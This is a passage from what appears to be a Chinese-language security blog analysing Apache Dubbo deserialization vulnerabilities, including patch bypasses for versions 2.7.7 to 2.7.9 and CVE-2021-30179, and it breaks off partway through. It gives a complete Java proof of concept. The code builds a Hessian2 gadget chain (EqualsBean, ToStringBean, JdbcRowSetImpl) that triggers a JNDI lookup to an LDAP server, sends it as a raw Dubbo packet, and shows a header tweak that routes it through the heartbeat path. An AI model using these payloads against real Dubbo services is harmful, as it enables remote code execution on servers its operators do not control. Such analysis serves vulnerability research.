href="https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0L131">https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0L131</a></p><p><img src="/2024/09/02/Dubbo/image-20240903170206345.png" alt="image-20240903170206345"></p><p>判断了方法名是否等于<code>$invoke $echo $invokeAsync</code> ,如果方法名称不对的话, 就会直接抛出异常</p><h4 id="2-7-7"><a href="#2-7-7" class="headerlink" title="2.7.7"></a>2.7.7</h4><p>虽然在2.7.7版本中判断了方法名称, 但是我们仍然有着绕过的思路</p><p>既然他的方法名只能够是这个，那我们就使得方法名用他们三个中的一个就行了</p><p>步骤：</p><p>将上面环境中的pom.xml中的版本改为2.7.7</p><p>且将comsumer端的方法名改为了<code>$echo</code>，之后运行</p><p><img src="/2024/09/02/Dubbo/image-20240903170401145.png" alt="image-20240903170401145"></p><p><img src="/2024/09/02/Dubbo/image-20240903170409243.png" alt="image-20240903170409243"></p><h4 id="2-7-8"><a href="#2-7-8" class="headerlink" title="2.7.8"></a>2.7.8</h4><h5 id="打默认Hessian2反序列化"><a href="#打默认Hessian2反序列化" class="headerlink" title="打默认Hessian2反序列化"></a>打默认Hessian2反序列化</h5><p>在该版本中</p><p>在<code>isGenericCall</code> 和 <code>isEcho</code>中有了更多的限制</p><p><img src="/2024/09/02/Dubbo/image-20240903170607800.png" alt="image-20240903170607800"></p><p>限制了之后参数类型为<code>Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;</code> 或者 <code>Ljava/lang/Object;</code> 的时候才会继续进行反序列化操作。上面的方法就寄了。</p><p>但接下来的反序列化姿势可以直接用到2.7.13，调用栈如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java">connect:<span class="hljs-number">624</span>, JdbcRowSetImpl (com.sun.rowset)<br>getDatabaseMetaData:<span class="hljs-number">4004</span>, JdbcRowSetImpl (com.sun.rowset)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>toString:<span class="hljs-number">158</span>, ToStringBean (com.rometools.rome.feed.impl)<br>toString:<span class="hljs-number">129</span>, ToStringBean (com.rometools.rome.feed.impl)<br>beanHashCode:<span class="hljs-number">198</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hashCode:<span class="hljs-number">180</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hash:<span class="hljs-number">339</span>, HashMap (java.util)<br>put:<span class="hljs-number">612</span>, HashMap (java.util)<br>doReadMap:<span class="hljs-number">145</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readMap:<span class="hljs-number">126</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2733</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2308</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>expect:<span class="hljs-number">3561</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readString:<span class="hljs-number">1883</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readUTF:<span class="hljs-number">89</span>, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)<br>decode:<span class="hljs-number">103</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">80</span>, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">57</span>, DecodeHandler (org.apache.dubbo.remoting.transport)<br>received:<span class="hljs-number">44</span>, DecodeHandler (org.apache.dubbo.remoting.transport)<br>run:<span class="hljs-number">57</span>, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)<br>runWorker:<span class="hljs-number">1149</span>, ThreadPoolExecutor (java.util.concurrent)<br>run:<span class="hljs-number">624</span>, ThreadPoolExecutor$Worker (java.util.concurrent)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>跟链子也偷个懒吧，不然我要写爆了….</p><p>POC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.dubbo.spring.boot.demo.consumer;<br><br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;<br><span class="hljs-keyword">import</span> com.sun.rowset.JdbcRowSetImpl;<br><span class="hljs-keyword">import</span> org.apache.dubbo.common.io.Bytes;<br><span class="hljs-keyword">import</span> org.apache.dubbo.common.serialize.Cleanable;<br><span class="hljs-keyword">import</span> org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.apache.dubbo.common.utils.FieldUtils.setFieldValue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getPayload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//反序列化时ToStringBean.toString()会被调用，触发JdbcRowSetImpl.getDatabaseMetaData-&gt;JdbcRowSetImpl.connect-&gt;Context.lookup</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jndiUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ldap://127.0.0.1:1389/xitdbc&quot;</span>;<br>        <span class="hljs-type">JdbcRowSetImpl</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcRowSetImpl</span>();<br>        rs.setDataSourceName(jndiUrl);<br>        rs.setMatchColumn(<span class="hljs-string">&quot;foo&quot;</span>);<br><br><span class="hljs-comment">//反序列化时EqualsBean.beanHashCode会被调用，触发ToStringBean.toString</span><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">item</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(JdbcRowSetImpl.class, rs);<br><br><span class="hljs-comment">//反序列化时HashMap.hash会被调用，触发EqualsBean.hashCode-&gt;EqualsBean.beanHashCode</span><br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ToStringBean.class, item);<br><br><span class="hljs-comment">//HashMap.put-&gt;HashMap.putVal-&gt;HashMap.hash</span><br>        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>        Class&lt;?&gt; nodeC;<br>        <span class="hljs-keyword">try</span> &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;<br>            nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>        &#125;<br>        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-type">int</span>.class, Object.class, Object.class, nodeC);<br>        nodeCons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">tbl</span> <span class="hljs-operator">=</span> Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>        Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, root, root, <span class="hljs-literal">null</span>));<br>        Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, root, root, <span class="hljs-literal">null</span>));<br>        setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br><br>        <span class="hljs-keyword">return</span> s;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>        Bytes.short2bytes((<span class="hljs-type">short</span>) <span class="hljs-number">0xdabb</span>, header);<br>        header[<span class="hljs-number">2</span>] = (<span class="hljs-type">byte</span>) ((<span class="hljs-type">byte</span>) <span class="hljs-number">0x80</span> | <span class="hljs-number">2</span>);<br>        Bytes.long2bytes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">100000000</span>), header, <span class="hljs-number">4</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">hessian2ByteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2ObjectOutput</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2ObjectOutput</span>(hessian2ByteArrayOutputStream);<br>        out.writeObject(getPayload());<br><br>        out.flushBuffer();<br>        <span class="hljs-keyword">if</span> (out <span class="hljs-keyword">instanceof</span> Cleanable) &#123;<br>            ((Cleanable) out).cleanup();<br>        &#125;<br>        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, <span class="hljs-number">12</span>);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        byteArrayOutputStream.write(header);<br>        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());<br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br><br>        <span class="hljs-meta">@SuppressWarnings( &quot;resource&quot;)</span><br>        <span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Socket</span>( <span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">9999</span>) ;<br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> socket.getOutputStream();<br>        outputStream.write(bytes);<br>        outputStream.flush() ;<br>        outputStream.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Hessian2-way-2"><a href="#Hessian2-way-2" class="headerlink" title="Hessian2 way 2"></a>Hessian2 way 2</h5><p>另一种利用方式就是在Dubbo协议解析的位置</p><p><code>org.apache.dubbo.remoting.exchange.codec.ExchangeCodec#decode</code>方法中</p><p><img src="/2024/09/02/Dubbo/image-20240903171016078.png" alt="image-20240903171016078"></p><p>Dubbo格式：</p><p><img src="/2024/09/02/Dubbo/image-20240903171032624.png" alt="image-20240903171032624"></p><p>开头的magic位类似java字节码文件里的魔数，用来判断是不是dubbo协议的数据包，魔数是常量0xdabb，用于判断报文的开始</p><p>函数在解析dubbo协议时先判断请求头是否是魔术字0xdabb</p><p>当魔术头校验通过后，将会调用<code>decodeBody</code>方法</p><p><img src="/2024/09/02/Dubbo/image-20240903171113020.png" alt="image-20240903171113020"></p><p>函数获取flag标志位，一共8个地址位。</p><p>低四位用来表示消息体数据用的序列化类型（默认hessian），高四位中，第一位为1表示是request请求，第二位为1表示双向传输（即有返回response），第三位为1表示是心跳事件。调用相应的反序列化函数对数据流进行反序列化操作</p><p>当服务端判断接收到的为事件时，会调用<code>decodeHeartbeatData</code>，跟进发现调用了<code>decodeEventData</code>方法，接着调用了一个<code>in.readObject()</code>，再到<code>readObject()</code>。</p><p>稍微将前面的payload修改一下将flag置为event事件就会触发漏洞</p><p>调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java">connect:<span class="hljs-number">624</span>, JdbcRowSetImpl (com.sun.rowset)<br>getDatabaseMetaData:<span class="hljs-number">4004</span>, JdbcRowSetImpl (com.sun.rowset)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>toString:<span class="hljs-number">158</span>, ToStringBean (com.rometools.rome.feed.impl)<br>toString:<span class="hljs-number">129</span>, ToStringBean (com.rometools.rome.feed.impl)<br>beanHashCode:<span class="hljs-number">198</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hashCode:<span class="hljs-number">180</span>, EqualsBean (com.rometools.rome.feed.impl)<br>hash:<span class="hljs-number">339</span>, HashMap (java.util)<br>put:<span class="hljs-number">612</span>, HashMap (java.util)<br>doReadMap:<span class="hljs-number">145</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readMap:<span class="hljs-number">126</span>, MapDeserializer (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2733</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">2308</span>, Hessian2Input (com.alibaba.com.caucho.hessian.io)<br>readObject:<span class="hljs-number">94</span>, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)<br>readEvent:<span class="hljs-number">83</span>, ObjectInput (org.apache.dubbo.common.serialize)<br>decodeEventData:<span class="hljs-number">400</span>, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)<br>decodeBody:<span class="hljs-number">122</span>, DubboCodec (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">122</span>, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)<br>decode:<span class="hljs-number">82</span>, ExchangeCodec (org.apache.dubbo.remoting.exchange.codec)<br>decode:<span class="hljs-number">48</span>, DubboCountCodec (org.apache.dubbo.rpc.protocol.dubbo)<br>decode:<span class="hljs-number">85</span>, NettyCodecAdapter$InternalDecoder (org.apache.dubbo.remoting.transport.netty4)<br>decodeRemovalReentryProtection:<span class="hljs-number">498</span>, ByteToMessageDecoder (io.netty.handler.codec)<br>callDecode:<span class="hljs-number">437</span>, ByteToMessageDecoder (io.netty.handler.codec)<br>channelRead:<span class="hljs-number">276</span>, ByteToMessageDecoder (io.netty.handler.codec)<br>invokeChannelRead:<span class="hljs-number">379</span>, AbstractChannelHandlerContext (io.netty.channel)<br>invokeChannelRead:<span class="hljs-number">365</span>, AbstractChannelHandlerContext (io.netty.channel)<br>fireChannelRead:<span class="hljs-number">357</span>, AbstractChannelHandlerContext (io.netty.channel)<br>channelRead:<span class="hljs-number">1410</span>, DefaultChannelPipeline$HeadContext (io.netty.channel)<br>invokeChannelRead:<span class="hljs-number">379</span>, AbstractChannelHandlerContext (io.netty.channel)<br>invokeChannelRead:<span class="hljs-number">365</span>, AbstractChannelHandlerContext (io.netty.channel)<br>fireChannelRead:<span class="hljs-number">919</span>, DefaultChannelPipeline (io.netty.channel)<br>read:<span class="hljs-number">163</span>, AbstractNioByteChannel$NioByteUnsafe (io.netty.channel.nio)<br>processSelectedKey:<span class="hljs-number">714</span>, NioEventLoop (io.netty.channel.nio)<br>processSelectedKeysOptimized:<span class="hljs-number">650</span>, NioEventLoop (io.netty.channel.nio)<br>processSelectedKeys:<span class="hljs-number">576</span>, NioEventLoop (io.netty.channel.nio)<br>run:<span class="hljs-number">493</span>, NioEventLoop (io.netty.channel.nio)<br>run:<span class="hljs-number">989</span>, SingleThreadEventExecutor$<span class="hljs-number">4</span> (io.netty.util.concurrent)<br>run:<span class="hljs-number">74</span>, ThreadExecutorMap$<span class="hljs-number">2</span> (io.netty.util.internal)<br>run:<span class="hljs-number">30</span>, FastThreadLocalRunnable (io.netty.util.concurrent)<br>run:<span class="hljs-number">748</span>, Thread (java.lang)<br></code></pre></td></tr></table></figure><p>payload修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">byte</span>[] header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];<br>Bytes.short2bytes((<span class="hljs-type">short</span>) <span class="hljs-number">0xdabb</span>, header);<br><span class="hljs-comment">//        header[2] = (byte) ((byte) 0x80 | 2);</span><br>header[<span class="hljs-number">2</span>] = (<span class="hljs-type">byte</span>) ((<span class="hljs-type">byte</span>) <span class="hljs-number">0x80</span> | <span class="hljs-number">0x20</span> | <span class="hljs-number">2</span>);<br>Bytes.long2bytes(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>().nextInt(<span class="hljs-number">100000000</span>), header, <span class="hljs-number">4</span>);<br></code></pre></td></tr></table></figure><h4 id="2-7-9"><a href="#2-7-9" class="headerlink" title="2.7.9"></a>2.7.9</h4><p>针对上一个版本hessian利用方式，对事件进行了长度限制：</p><p><img src="/2024/09/02/Dubbo/image-20240903171400694.png" alt="image-20240903171400694"></p><p>判断了待反序列化的数据长度是否超过配置的阈值（默认为50），如超过则抛出异常，不再继续反序列化，这样就导致了上面的way 2不能够使用了</p><p>但是上面的第一种方法仍然可以使用。</p><p><img src="/2024/09/02/Dubbo/image-20240903171423720.png" alt="image-20240903171423720"></p><h4 id="CVE-2021-30179"><a href="#CVE-2021-30179" class="headerlink" title="CVE-2021-30179"></a>CVE-2021-30179</h4><p>影响：</p><p>Apache Dubbo <strong>2.7.0</strong> to <strong>2.7.9</strong></p><p>Apache Dubbo <strong>2.6.0</strong> to <strong>2.6.9</strong></p><p>小跟一下。</p><p>根据前面的分析我们知道，会调用<code>DecodeHandler#decode</code>方法进行处理</p><p>之后在<code>DecodeHandler#decode</code>方法中存在过滤操作：</p><p><img src="/2024/09/02/Dubbo/image-20240908000841134.png" alt="image-20240908000841134"></p><p>意为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">判断方法名是否为invoke或者invokeAsync，desc是否为Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;，如果不满足则直接抛出异常<br><br>decode完成之后将调用HeaderExchangeHandler.java#received方法处理请求，若为泛型引用，则将调用GenericFilter#invoke方法<br></code></pre></td></tr></table></figure><p>在获取了方法名&#x2F;类型&#x2F;参数之后，将会通过反射获取该方法，如果不存在就会抛出异常</p><p>接下来将通过获取请求中的generic参数来选择通过raw.return&#x2F;nativejava&#x2F;bean反序列化参数成pojo对象。</p><p><img src="/2024/09/02/Dubbo/image-20240908000942693.png" alt="image-20240908000942693"></p><p>1、如果generic为raw.return或者true，将调用PojoUtils#realize方法</p><p><img src="/2024/09/02/Dubbo/image-20240908001012036.png" alt="image-20240908001012036"></p><p><img src="/2024/09/02/Dubbo/image-20240908001018546.png" alt="image-20240908001018546"></p><p>接着调用了<code>readlize</code> <code>realize0</code></p><p>在readlize0中的逻辑为</p><blockquote><p>若pojo为Map实例，则从pojo（也就是一开始的第三个参数）获取key为“class”的值，并通过反射得到class所对应的类type，再判断对象的类型进行下一步处理</p><p>如果type不是Map的子类、不为Object.class且不是接口，则进入else，在else中，对type通过反射进行了实例化，得到对象dest</p><p>再对pojo进行遍历，以键名为name，值为value，调用getSetterMethod(dest.getClass(), name, value.getClass());获取set方法</p></blockquote><p><img src="/2024/09/02/Dubbo/image-20240908001114136.png" alt="image-20240908001114136"></p><p>，之后就可以通过<code>org.apache.xbean.propertyeditor.JndiConverter</code>类中的<code>setAsText</code>方法进行JNDI注入。</p><p>看一手调用栈：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">setAsText:<span class="hljs-number">59</span>, AbstractConverter (org.apache.xbean.propertyeditor)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>realize0:<span class="hljs-number">483</span>, PojoUtils (org.apache.dubbo.common.utils)<br>realize:<span class="hljs-number">211</span>, PojoUtils (org.apache.dubbo.common.utils)<br>realize:<span class="hljs-number">99</span>, PojoUtils (org.apache.dubbo.common.utils)<br>invoke:<span class="hljs-number">91</span>, GenericFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">38</span>, ClassLoaderFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">41</span>, EchoFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>reply:<span class="hljs-number">145</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">152</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">177</span>, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)<br></code></pre></td></tr></table></figure><p>2、如果generic为bean, 则将会调用<code>JavaBeanSerializeUtil#deserialize</code>处理</p><p><img src="/2024/09/02/Dubbo/image-20240908001222281.png" alt="image-20240908001222281"></p><p>其中调用了<code>instantiateForDeserialize</code>方法，返回一个JavaBeanDescriptor描述的对象</p><p>之后调用<code>deserializeInternal</code>进行反序列化， 如果beanDescriptor.isBeanType()（只需要实例化JavaBeanDescriptor时指定即可），则将遍历beanDescriptor，获取property及value，调用getSetterMethod获取对应的set方法</p><p>最后利用反射执行method.invoke(dest, value);，就可以使用org.apache.xbean.propertyeditor.JndiConverter的setAsText打JNDI注入。</p><p><img src="/2024/09/02/Dubbo/image-20240908001303999.png" alt="image-20240908001303999"></p><p>调用栈为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">setAsText:<span class="hljs-number">59</span>, AbstractConverter (org.apache.xbean.propertyeditor)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">497</span>, Method (java.lang.reflect)<br>deserializeInternal:<span class="hljs-number">282</span>, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)<br>deserialize:<span class="hljs-number">215</span>, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)<br>deserialize:<span class="hljs-number">204</span>, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)<br>invoke:<span class="hljs-number">115</span>, GenericFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">38</span>, ClassLoaderFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>invoke:<span class="hljs-number">41</span>, EchoFilter (org.apache.dubbo.rpc.filter)<br>invoke:<span class="hljs-number">83</span>, ProtocolFilterWrapper$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol)<br>reply:<span class="hljs-number">145</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">152</span>, DubboProtocol$<span class="hljs-number">1</span> (org.apache.dubbo.rpc.protocol.dubbo)<br>received:<span class="hljs-number">177</span>, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)<br></code></pre></td></tr></table></figure><p>3、如果generic是nativejava, 将遍历args，如果args[i]的类型为byte，以args[]为参实例化一个UnsafeByteArrayInputStream，再通过反射获得NativeJavaSerialization，再调用NativeJavaSerialization#readObject方法</p><p><img src="/2024/09/02/Dubbo/image-20240908001352732.png" 